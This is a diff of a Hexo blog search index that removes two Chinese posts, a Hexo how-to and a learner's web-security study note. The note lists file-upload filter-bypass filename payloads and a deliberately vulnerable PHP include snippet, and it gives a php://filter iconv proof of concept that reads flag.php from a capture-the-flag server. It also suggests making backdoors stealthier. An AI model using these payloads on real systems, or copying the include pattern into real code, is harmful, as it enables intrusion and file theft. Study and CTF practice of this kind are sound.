@@ -784,209 +987,6 @@
       </categories>
       <tags>
         <tag>靶场渗透测试</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>博客文章编写方式</title>
-    <url>/2022/10/15/17-58-19/</url>
-    <content><![CDATA[<h1 id="你好"><a href="#你好" class="headerlink" title="你好"></a>你好</h1><h2 id="博客的创建方式是先"><a href="#博客的创建方式是先" class="headerlink" title="博客的创建方式是先"></a>博客的创建方式是先</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new &quot;文章主题&quot;</span><br><span class="line">然后去文件地址编辑</span><br><span class="line">编辑好后</span><br><span class="line">再</span><br><span class="line">hexo c</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br><span class="line">上传到github是</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="给文章添加标签分类"><a href="#给文章添加标签分类" class="headerlink" title="给文章添加标签分类:"></a>给文章添加标签分类:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title: 博客文章编写方式        #文章标题</span><br><span class="line">date: 2022-10-15 17:58:19   #文章编写修改时间</span><br><span class="line">tags: hexo博客搭建说明         #文章标签说明</span><br><span class="line">categories : 使用说明          #文章分类类别</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h1 id="图片上传"><a href="#图片上传" class="headerlink" title="图片上传:"></a>图片上传:</h1><p>由于上传不显示图片的原因,所以我采用了另一种图片上传方式,虽有些繁琐,但极大解决了不会修改图像链接的问题.</p>
-<p>首先,创建以上传博客文件命名的文件夹的插件和命令不用删除,我们可以将这个文件夹当作我们上传图片时的备份文件夹</p>
-<p>然后就是上传图片的操作了</p>
-<p>这是原帖子链接</p>
-<p><a href="https://blog.csdn.net/Qxiaofei_/article/details/124629908">(2条消息) 【Hexo】GitHub+Typora写博客+图片上传_Q大帅的博客-CSDN博客_hexo如何上传图片</a></p>
-<p>下面我先简单演示</p>
-<p>创建一个新的imgs文件夹,位于</p>
-<p><img src="/imgs/$%7Bfiilename%7D/20221016(1).png"></p>
-<p>source 目录下</p>
-<p>我们事先就已经在图片上传偏好设置里就将图片上传的默认目录修改好了</p>
-<p><img src="/imgs/$%7Bfiilename%7D/20221016(2).png"></p>
-<p>如图,接下来就是在编写的博客开头添加图像默认路径</p>
-<p>在”格式””图像””设置图片根目录”</p>
-<p>成功后</p>
-<p>如图:</p>
-<p><img src="/imgs/$%7Bfiilename%7D/20221016(3).png"></p>
-<p>随后就是插入图片</p>
-<p>在”格式” “图像” “插入图片”</p>
-<p>一定要记得将图片放在imgs 文件夹中</p>
-<p>这样引用图片时才不会出错</p>
-<p>然后也可以将图片放在对应博客名的文件夹中备份,方便修改时查阅</p>
-<p>最后放上我可爱的草神:</p>
-<p><img src="/imgs/$%7Bfiilename%7D/1.gif"></p>
-]]></content>
-      <categories>
-        <category>使用说明</category>
-      </categories>
-      <tags>
-        <tag>hexo博客搭建说明</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>web基础</title>
-    <url>/2022/10/17/17-43-58/</url>
-    <content><![CDATA[<h1 id="总结一下到目前所学的基础知识"><a href="#总结一下到目前所学的基础知识" class="headerlink" title="总结一下到目前所学的基础知识:"></a>总结一下到目前所学的基础知识:</h1><p>大概涉及很多方面但涉及到的深入一点的也会另开新卷详细描述</p>
-<p>主要涉及到的都是小迪2020课程里面的内容:</p>
-<p>常常更新</p>
-<h2 id="摘抄"><a href="#摘抄" class="headerlink" title="摘抄:"></a>摘抄:</h2><p><strong>1：攻击方与防御方的本质是什么？</strong>增加对方的时间成本，人力成本，资源成本（不限制于服务器资源），金钱成本。<strong>2：安全公司的本质是什么？</strong>盈利，最小投入，最大产出。<strong>3：安全公司产品的本质是什么？</strong>能适应大部分客户，适应市场化，并且适应大部分机器。（包括不限制于资源紧张，宽带不足等问题的客户）<strong>4：安全人员的本质是什么？</strong>赚钱，养家。买房，还房贷。导致，快速解决客户问题（无论暂时还是永久性解决），以免投诉。<strong>5：对接客户的本质是什么？</strong>对接客户也是某公司内安全工作的一员，与概念 4 相同。清晰了以上 5 个概念，作为攻击者，要首先考虑到对抗成本，什么样的对抗成本，能满足概念 1-5。影响或阻碍对手方的核心利益。把概念加入到后门，更隐蔽，更长久。</p>
-<h2 id="HTTP-规划定义了-8-种可能的请求方法："><a href="#HTTP-规划定义了-8-种可能的请求方法：" class="headerlink" title="HTTP 规划定义了 8 种可能的请求方法："></a>HTTP 规划定义了 8 种可能的请求方法：</h2><p>GET：检索 URL 中标识资源的一个简单请求 </p>
-<p>HEAD：与 GET 方法相同，服务器只返回状态行和头标，并不返回请求文档 </p>
-<p>POST：服务器接受被写入客户端输出流中的数据的请求 </p>
-<p>PUT：服务器保存请求数据作为指定 URL 新内容的请求 </p>
-<p>DELETE：服务器删除 URL 中命令的资源的请求 </p>
-<p>OPTIONS：关于服务器支持的请求方法信息的请求 </p>
-<p>TRACE：web 服务器反馈 Http 请求和其头标的请求 </p>
-<p>CONNECT ：已文档化，但当前未实现的一个方法，预留做隧道处理 </p>
-<p>#请求头由关键字/值对组成，每行一对，关键字和值用冒号分享。请求头标通知服务器腾于客户端的功能和标识。 </p>
-<h2 id="HTTP-响应码："><a href="#HTTP-响应码：" class="headerlink" title="HTTP 响应码："></a>HTTP 响应码：</h2><p>1xx：信息，请求收到，继续处理 </p>
-<p>2xx：成功，行为被成功地接受、理解和采纳 </p>
-<p>3xx：重定向，为了完成请求，必须进一步执行的动作 </p>
-<p>4xx：客户端错误 </p>
-<p>5xx：服务器错误 </p>
-<h1 id="信息收集决定攻击深度"><a href="#信息收集决定攻击深度" class="headerlink" title="信息收集决定攻击深度"></a>信息收集决定攻击深度</h1><p><img src="/imgs/$%7Bfiilename%7D/image-20220929190720671.png"></p>
-<h2 id="信息收集是攻击面打开的必要操作"><a href="#信息收集是攻击面打开的必要操作" class="headerlink" title="信息收集是攻击面打开的必要操作"></a>信息收集是攻击面打开的必要操作</h2><p>更多的信息可以测试更多的漏洞方面</p>
-<p>无论是src还是渗透测试一个具体目标</p>
-<p>信息收集的方式多种多样</p>
-<p>有像fofa一样的在黑暗引擎中大海捞针,不错过与测试网站相关的一个页面</p>
-<p>有得到一个web页面后对网站进行扫描,收集IP地址开放的端口号,网站后台目录,后台文件,有时候我们的突破口就产生在这里面</p>
-<p>最常用的就是御剑后台扫描工具,nmap工具,kali里的dirp 工具,部署在服务器端上的msf(这是一个大学问) ,还有一款叫水泽的信息收集工具,等等,后面知道更多了还会添加.</p>
-<p>内网信息收集是针对进入目标主机后进行的信息收集操作,此方面涉及到系统的操作命令学习,</p>
-<p>（<a href="https://blog.csdn.net/qq_43001579/article/details/83591539">(真·Nmap用法大全_车大叔的博客-CSDN博客</a>）</p>
-<h3 id="其他补充"><a href="#其他补充" class="headerlink" title="其他补充:"></a>其他补充:</h3><p>F12进行查看网站网络可以看到server：里面的信息</p>
-<p>server：看的信息很全的很可能就是由网页搭建平台搭建的</p>
-<p>WAF存在时，扫描会产生误差，网站可能拒绝访问</p>
-<p>检查时网站返回的数据包里面可能有某些可疑信息，里面可能就是含有WAF</p>
-<p>（X-Powered-By：WAF）</p>
-<p>子域名查找及C段旁注等。</p>
-<h1 id="web漏洞知识点"><a href="#web漏洞知识点" class="headerlink" title="web漏洞知识点"></a>web漏洞知识点</h1><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入:"></a>sql注入:</h2><p><img src="/imgs/$%7Bfiilename%7D/image-20220905205200543.png"></p>
-<h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞:"></a>文件上传漏洞:</h2><p><img src="/imgs/$%7Bfiilename%7D/image-20220906174853666.png"></p>
-<h4 id="查找与判断"><a href="#查找与判断" class="headerlink" title="查找与判断"></a>查找与判断</h4><p>黑盒测试，扫描</p>
-<p>搜索引擎搜索upload</p>
-<p>会员文件传输页面</p>
-<p>后台权限页面</p>
-<p>白盒代码分析查找文件上传源码</p>
-<p>文件上传抓包判断</p>
-<p>黑名单：明确不让上传的格式后缀</p>
-<p>在定义后缀名不完整的情况下，我们可以用其他格式，达到同样效果，看网站的知识应用层面</p>
-<p>白名单：明确可以上传的格式后缀</p>
-<p>更安全一些</p>
-<h3 id="文件上传漏洞测试思维"><a href="#文件上传漏洞测试思维" class="headerlink" title="文件上传漏洞测试思维"></a>文件上传漏洞测试思维</h3><p>1,通过字典扫描，或者判断会员中心等都可能存在文件上传漏洞</p>
-<p>2,到测试站点是否存在解析漏洞如：iis apache Nginx 等</p>
-<p>3,测试文件上传漏洞，是否可以验证或者绕过，上传一个php文档判断黑白名单，判断是否存在格式限制或内容审查</p>
-<p>4,若上面的内容都没有则判断，是否为cms漏洞，在知道cms类型后可以搜索是否爆出过漏洞</p>
-<p>5,如果都没有则再来到编辑器漏洞，判断编辑器类型，搜索漏洞</p>
-<p>6,没有就查找是否爆出过cve词条漏洞</p>
-<p><img src="/imgs/$%7Bfiilename%7D/image-20220908201230886.png">#上传参数名解析：明确哪些东西能修改？</p>
-<p>Content-Disposition：表单数据 一般可更改</p>
-<p>name：表单参数值，不能更改</p>
-<p>filename：文件名，可以更改</p>
-<p>Content-Type：上传文件带的参数值 文件 MIME，视情况更改</p>
-<p>#常见绕过方法：</p>
-<p>数据溢出-防匹配(xxx…)</p>
-<p>符号变异-防匹配（</p>
-<p>‘ “ ;）</p>
-<p>数据截断-防匹配(%00 ; 换行)</p>
-<p>重复数据-防匹配(参数多次)</p>
-<p>#Payload:</p>
-<p>大量垃圾数据缓冲溢出(Content-Disposition,filename 等)</p>
-<p>filename=x.php</p>
-<p>filename=”x.php</p>
-<p>filename=’x.php</p>
-<p>filename=”a.jpg;.php”;</p>
-<p>filename=”a.php%00.jpg”</p>
-<p>filename=”Content-Disposition: form-data; name=”upload_file”;x.php”</p>
-<p>filename=”x.jpg”;filename=”x.jpg”;…..filename=”x.php”;</p>
-<p>filename=”xxx/x.jpg”</p>
-<p>filename=</p>
-<p>“</p>
-<p>x</p>
-<p>.</p>
-<p>p</p>
-<p>h</p>
-<p>p</p>
-<p>“</p>
-<p>/jpeg；/x.php   xxxx/x.php</p>
-<h3 id="MIME-类型"><a href="#MIME-类型" class="headerlink" title="MIME 类型"></a>MIME 类型</h3><p>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的标准，用来表示文档、文件或字节流的性质和格式。</p>
-<p>MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。</p>
-<p>浏览器通常使用 MIME 类型（而不是文件扩展名）来确定如何处理URL，因此 We b服务器在响应头中添加正确的 MIME 类型非常重要。如果配置不正确，浏览器可能会无法解析文件内容，网站将无法正常工作，并且下载的文件也会被错误处理。</p>
-<h2 id="xss跨站"><a href="#xss跨站" class="headerlink" title="xss跨站"></a>xss跨站</h2><p><strong>跨网站脚本（Cross-site scripting，XSS）</strong> 又称为跨站脚本攻击，是一种经常出现在Web应用程序的安全漏洞攻击，也是代码注入的一种。XSS是由于Web应用程序对用户的输入过滤不足而产生的，攻击者利用网站漏洞把恶意的脚本代码注入到网页之中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害者用户可能采取Cookie窃取、会话劫持、钓鱼欺骗等各种攻击。这类攻击通常包含了HTML以及用户端脚本语言。</p>
-<h2 id="CSRF和SSRF"><a href="#CSRF和SSRF" class="headerlink" title="CSRF和SSRF"></a>CSRF和SSRF</h2><h3 id="csrf跨站请求伪造"><a href="#csrf跨站请求伪造" class="headerlink" title="csrf跨站请求伪造"></a>csrf跨站请求伪造</h3><p>使用burp里自带的工具</p>
-<p><img src="/imgs/$%7Bfiilename%7D/20221017191959.png"></p>
-<p>此漏洞利用：修改信息，添加管理员</p>
-<p>注意网站有无添加，修改功能才可能有csrf漏洞存在</p>
-<p>如果测试后没有变化，网站不存在这个漏洞</p>
-<ol>
-<li>抓取一个正常请求的数据包，如果没有Referer字段和token，那么极有可能存在CSRF漏洞</li>
-<li>如果有Referer字段，但是去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。</li>
-<li>利用工具进行CSRF检测。如：CSRFTESTER，CSRF REQUEST BUILDER等</li>
-</ol>
-<h3 id="ssrf-服务器请求伪造"><a href="#ssrf-服务器请求伪造" class="headerlink" title="ssrf 服务器请求伪造"></a>ssrf 服务器请求伪造</h3><p>影响到内部系统</p>
-<p><img src="/imgs/$%7Bfiilename%7D/image-20220912210408290.png"></p>
-<p><img src="/imgs/$%7Bfiilename%7D/image-20220912210429653.png"></p>
-<p><img src="/imgs/$%7Bfiilename%7D/image-20220912210449078.png"></p>
-<p><a href="https://blog.csdn.net/weixin_45663905/article/details/108086622">服务器端请求伪造——SSRF_ihszg的博客-CSDN博客_伪造发包服务器</a></p>
-<h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><p>可控制变量</p>
-<p>使用函数造成的效果</p>
-<p>文件包含漏洞的产生原因是在通过引入文件时，引用的文件名，用户可控，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。当被包含的文件在服务器本地时，就形成的本地文件包含漏洞。被包含的文件在第三方服务器时，就形成了远程文件包含漏洞。</p>
-<p>　　本地到远程：如果php.ini的配置选项allow_url_fopen和allow_url_include为ON的话，则文件包含函数是可以加载远程文件的，这种漏洞被称为远程文件包含漏洞。</p>
-<p>　　include()：当使用该函数包含文件时，只有代码执行到include（）函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行。</p>
-<p>　　include_once()：这个函数跟include函数作用几乎相同，只是他在导入函数之前先检测下该文件是否被导入。如果已经执行一遍那么就不重复执行了。</p>
-<p>　　require()：跟include唯一不同的是，当产生错误时，include下面继续运行而require停止运行了。</p>
-<p>　　require_once()：它的功能与require()相同，区别在于当重复调用同一文件时，程序只调用一次。</p>
-<p>　　看到这四个函数时，看到有参数，且参数可控，没有过滤，或过滤不严，就一定有文件包含漏洞。</p>
-<p>常见漏洞代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[page]))&#123; include $_GET[page];&#125; else&#123;include&quot;home.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>　触发漏洞的条件：</p>
-<p>　　　　web应用采用include()等文件包含函数通过动态变量的方式引入需要包含的文件。</p>
-<p>　　　　用户能够控制该动态变量。</p>
-<h2 id="文件包含漏洞概括：-文件包含漏洞（完整版）-Vansnc的博客-CSDN博客-文件包含漏洞"><a href="#文件包含漏洞概括：-文件包含漏洞（完整版）-Vansnc的博客-CSDN博客-文件包含漏洞" class="headerlink" title="文件包含漏洞概括： 文件包含漏洞（完整版）_Vansnc的博客-CSDN博客_文件包含漏洞"></a>文件包含漏洞概括：<a href="https://blog.csdn.net/Vansnc/article/details/82528395"> 文件包含漏洞（完整版）_Vansnc的博客-CSDN博客_文件包含漏洞</a></h2><h2 id="文件包含漏洞伪协议利用补充："><a href="#文件包含漏洞伪协议利用补充：" class="headerlink" title="文件包含漏洞伪协议利用补充："></a>文件包含漏洞伪协议利用补充：</h2><h3 id="php-filter的各种过滤器"><a href="#php-filter的各种过滤器" class="headerlink" title="php://filter的各种过滤器"></a>php://filter的各种过滤器</h3><p>官方文档介绍的可用过滤器列表：<a href="https://www.php.net/manual/zh/filters.php">PHP: 可用过滤器列表 - Manual</a></p>
-<p>应用链接：<a href="https://blog.csdn.net/qq_44657899/article/details/109300335"> php://filter的各种过滤器_天问_Herbert555的博客-CSDN博客_php://filter rot13</a></p>
-<p>使用例子链接:</p>
-<p>file_include：<a href="https://adworld.xctf.org.cn/challenges/details?hash=ceb014e8-3a5a-11ed-abf3-fa163e4fa609&amp;task_category_id=3">https://adworld.xctf.org.cn/challenges/details?hash=ceb014e8-3a5a-11ed-abf3-fa163e4fa609&amp;task_category_id=3</a></p>
-<p>解题参考：<a href="https://blog.csdn.net/shelter1234567/article/details/127393549">江苏工匠杯_file _include_wp_昵称还在想呢的博客-CSDN博客</a></p>
-<p>文件包含的绕过或许也可以尝试一下过滤器绕过的思路</p>
-<p>在这题ctf例题中就是采用的过滤器绕过思路中的</p>
-<p>0x02 Conversion Filters（转换过滤器）</p>
-<p>转换过滤器里的convert.iconv.*</p>
-<p>这个过滤器需要 php 支持 iconv，而 iconv 是默认编译的（、iconv不是php的默认函数，也是默认安装的模块。需要安装才能用的。）。使用convert.iconv.*过滤器等同于用<code>iconv()</code>函数处理所有的流数据。</p>
-<p>使用方法：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt; </span><br><span class="line">or </span><br><span class="line">convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt;</span><br></pre></td></tr></table></figure>
-
-<p><code>&lt;input-encoding&gt;和&lt;output-encoding&gt;</code> 就是编码方式，有如下几种;</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UCS-4*</span><br><span class="line">UCS-4BE</span><br><span class="line">UCS-4LE*</span><br><span class="line">UCS-2</span><br><span class="line">UCS-2BE</span><br><span class="line">UCS-2LE</span><br><span class="line">UTF-32*</span><br><span class="line">UTF-32BE*</span><br><span class="line">UTF-32LE*</span><br><span class="line">UTF-16*</span><br><span class="line">UTF-16BE*</span><br><span class="line">UTF-16LE*</span><br><span class="line">UTF-7</span><br><span class="line">UTF7-IMAP</span><br><span class="line">UTF-8*</span><br><span class="line">ASCII*</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>利用姿势：把flag.php的内容从<code>UCS-2LE</code>编码转换为<code>UCS-2BE</code>编码</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=2.php</span><br></pre></td></tr></table></figure>
-
-<p>在本例题中</p>
-<p>知道绕过方式后我们回显check.php里面的源码:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:61806/?filename=php://filter/convert.iconv.UTF-7.UCS-2LE/resource=check.php</span><br></pre></td></tr></table></figure>
-
-<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221025114012.png"></p>
-<p>如图,本题对过滤器进行了限制,还限制了convert.iconv.*过滤器里的编码类型.但好在该过滤器支持的编码类型多样,所以换种编码类型也能达到绕过效果,(多试几种编码类型)</p>
-<p>本题通关poc</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:61806/?filename=php://filter/convert.iconv.UTF-7.UCS-2LE/resource=flag.php</span><br></pre></td></tr></table></figure>
-
-<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221025114526.png"></p>
-<p>这还有一题也是ctf里面的文件包含形式，这题的过滤代码更多</p>
-<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221025155125.png"></p>
-<p>也是使用这个过滤器问题，多试几次过滤器里面的编码形式就可以得出答案了。</p>
-<p>所以文件包含的绕过思路绝不止一种,多试试.</p>
-]]></content>
-      <categories>
-        <category>基础知识</category>
-      </categories>
-      <tags>
-        <tag>基础知识</tag>
       </tags>
   </entry>
 </search>
